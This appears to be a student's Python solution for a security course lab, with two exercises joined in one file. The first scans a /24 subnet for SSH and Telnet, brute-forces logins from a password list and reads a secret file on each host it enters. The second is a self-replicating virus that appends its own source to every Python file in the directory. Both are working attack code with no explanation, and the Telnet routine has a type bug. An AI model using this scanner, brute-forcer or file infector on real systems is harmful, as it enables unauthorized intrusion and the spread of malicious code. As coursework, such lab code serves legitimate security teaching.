import socket
import paramiko
import time
import telnetlib

creds = open('/home/cse/Lab2/Q2pwd', 'r').readlines()
ports = [22,23]

def connect(ip, creds):
    for i in range(len(creds)):
        user, passw = creds[i].strip().split(' ')
        try:
            client = paramiko.client.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, username=user, password=passw, banner_timeout=200)
            _stdin, _stdout,_stderr = client.exec_command("cat Q2secret")
            secret = _stdout.read().decode()
            client.close()
            print(f"{ip}:22 {user},{passw} Secret = {secret}")
            return True
        except paramiko.AuthenticationException:
            pass
        except paramiko.SSHException:
            print(f"Waiting 5 seconds")
            time.sleep(5)
            return connect(ip, creds[i:])
    return False

def connectTelenet(ip):
    for cred in creds:
        user, password = cred.strip().split(' ')
        try:
            tn = telnetlib.Telnet(ip, timeout=1)
            tn.read_until(b"login: ")
            tn.write(user.encode('ascii') + b"\n")
            if password:
                tn.read_until(b"Password: ")
                tn.write(password.encode('ascii') + b"\n")
            
            tn.write("cat Q2secret\n")
            tn.write(b"exit\n")
            print(tn.read_all().decode('ascii'))
            tn.close()
            print(f"{ip}:23 {user}, {password}")
            return True
        except Exception:
            pass
    return False

def scanPorts():
    openTelnet = []
    openSSH = []
    for port in ports:
        for i in range(256):
            ip = f'172.16.48.{i}'
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = s.connect_ex((ip,port))
            if result == 0:
                if port == 23:
                    openTelnet.append(ip)
                else:
                    openSSH.append(ip)
            s.close()
    return openSSH, openTelnet

openSSH, openTelnet = scanPorts()
for tel in openTelnet:
    connectTelenet(tel)
for ip in openSSH:
    connect(ip, creds)

import glob
Files = [f for f in glob.glob('*.py')]
OutputFile = 'Q1C.out' in [f for f in glob.glob("*.out")]

for f in Files:
    if OutputFile:
        virus =[line.strip() for line in open('Q1C.out', 'r').readlines()]
    else:
        with open('Q1C.out', 'w') as w:
            w.write('Q1C.py\n')
            virus = ['Q1C.py']
    if f not in virus:
        Q1CLines = ['\n'] + open('Q1C.py', 'r').readlines()
        with open(f, 'a') as modify, open('Q1C.out', 'a') as out:
            for line in Q1CLines:
                modify.write(line)
            out.write(f + '\n')



















